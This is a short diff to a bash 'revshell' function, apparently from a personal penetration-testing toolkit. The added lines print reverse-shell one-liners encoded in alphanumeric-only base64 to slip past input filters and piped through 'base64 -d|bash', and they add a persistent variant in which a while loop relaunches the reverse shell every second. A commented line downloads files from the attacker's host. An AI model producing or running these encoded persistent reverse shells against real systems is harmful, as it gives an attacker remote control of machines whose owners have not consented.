@@ -96,8 +96,13 @@ function revshell {
   echo "bash -c '$bashshell'"
 
   # optimize base64 to contain no special chars
+  echo ""
   echo "optimizing base 64..."
   alnumb64=$(~/kb/bash-scripting/find-alphanum-base64.sh "$bashshell" | head -n 1)
+  echo "echo $alnumb64|base64 -d|bash"
+  echo ""
+  echo "optimizing while loop reverse shell"
+  alnumb64=$(~/kb/bash-scripting/find-alphanum-base64.sh "while [ 1 ]; do sleep 1; bash -c '$bashshell'; done" | head -n 1)
   echo "echo $alnumb64|base64 -d|bash"
 
   #downloadfiles "http://$lhost:$lport/filename.exe"
